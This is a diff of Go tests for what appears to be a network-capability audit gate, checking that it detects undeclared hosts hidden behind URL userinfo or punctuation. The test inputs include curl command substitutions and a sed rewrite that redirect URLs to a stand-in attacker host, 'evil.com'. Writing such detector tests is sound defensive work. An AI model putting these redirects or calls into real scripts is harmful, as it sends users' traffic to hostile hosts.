@@ -89,6 +89,41 @@ func TestDeclaredHostURLPunctuation(t *testing.T) {
 	}
 }
 
+// Terminal shell/prose punctuation permits reserved hosts, but userinfo still identifies the real host.
+func TestReservedHostURLPunctuation(t *testing.T) {
+	for _, text := range []string{"$(curl https://board.test)", "See https://board.test, then continue", "(https://Board.Test.:443)", "curl https://board.test;"} {
+		t.Run(text, func(t *testing.T) {
+			subject := subjectWith(t, text, capabilities.ImplicitNone(), 3)
+			if findings := detect(subject.Snapshot, subject.Capabilities); len(findings) != 0 {
+				t.Fatalf("reserved punctuation: %+v", findings)
+			}
+		})
+	}
+	for _, text := range []string{"$(curl https://board.test@evil.com)", "See https://board.test,@evil.com, then continue", "https://board.test;user@evil.com"} {
+		subject := subjectWith(t, text, capabilities.ImplicitNone(), 3)
+		if _, errs := Gate(newCfg(t, "strict", "high"), []Subject{subject}); len(errs) != 1 || !strings.Contains(errs[0], "contacts evil.com") {
+			t.Fatalf("userinfo hid real host: %v", errs)
+		}
+	}
+}
+
+// Each URL start is inspected even when a declared or reserved URL directly precedes an undeclared URL.
+func TestReservedURLDiscoveryKeepsLaterHosts(t *testing.T) {
+	for _, text := range []string{
+		"sed 's|https://github.com|https://evil.com|g'",
+		"sed 's|https://board.test|https://evil.com|g'",
+		"https://github.com,https://evil.com",
+		"https://board.test@github.com|https://evil.com",
+	} {
+		t.Run(text, func(t *testing.T) {
+			subject := subjectWith(t, text, capabilities.Manifest{Network: []string{"github.com"}}, 3)
+			if _, errs := Gate(newCfg(t, "strict", "high"), []Subject{subject}); len(errs) == 0 || !strings.Contains(strings.Join(errs, "\n"), "contacts evil.com") {
+				t.Fatalf("later undeclared URL hidden: %v", errs)
+			}
+		})
+	}
+}
+
 // A reserved-only strict audit passes; adding an undeclared real host or revocation still blocks.
 func TestReservedDomainsKeepStrictGate(t *testing.T) {
 	cfg := newCfg(t, "strict", "high")
@@ -119,13 +154,17 @@ func TestReservedDomainsInvalidateOldRulesetCache(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	oldPath := filepath.Join(trustDir(cfg.Home(), digest), "verdict-"+strings.Join([]string{cfg.Audit.Backend, cfg.Audit.Model, PromptVersion, "2"}, "-")+".json")
 	old := []byte(`{"schema_version":1,"commit":"abc","directory":".","findings":[{"id":"audit.capability.network-undeclared","severity":"high","file":"scripts/tool","evidence":"contacts board.example.test","verifiable":true}]}`)
-	if err := os.MkdirAll(filepath.Dir(oldPath), 0o755); err != nil {
-		t.Fatal(err)
-	}
-	if err := os.WriteFile(oldPath, old, 0o644); err != nil {
-		t.Fatal(err)
+	var oldPaths []string
+	for _, ruleset := range []string{"2", "3"} {
+		oldPath := filepath.Join(trustDir(cfg.Home(), digest), "verdict-"+strings.Join([]string{cfg.Audit.Backend, cfg.Audit.Model, PromptVersion, ruleset}, "-")+".json")
+		if err := os.MkdirAll(filepath.Dir(oldPath), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(oldPath, old, 0o644); err != nil {
+			t.Fatal(err)
+		}
+		oldPaths = append(oldPaths, oldPath)
 	}
 	if warnings, errs := Gate(cfg, []Subject{subject}); len(warnings) != 0 || len(errs) != 0 {
 		t.Fatalf("current gate reused the old refusal: warnings=%v errors=%v", warnings, errs)
@@ -133,7 +172,9 @@ func TestReservedDomainsInvalidateOldRulesetCache(t *testing.T) {
 	if current, hit := loadCachedFindings(cfg, digest, hashing.VersionV1, subject); !hit || len(current) != 0 {
 		t.Fatalf("current cache: findings=%+v hit=%v", current, hit)
 	}
-	if retained, err := os.ReadFile(oldPath); err != nil || !bytes.Equal(retained, old) {
-		t.Fatalf("old-ruleset record was changed: error=%v", err)
+	for _, oldPath := range oldPaths {
+		if retained, err := os.ReadFile(oldPath); err != nil || !bytes.Equal(retained, old) {
+			t.Fatalf("old-ruleset record was changed: error=%v", err)
+		}
 	}
 }
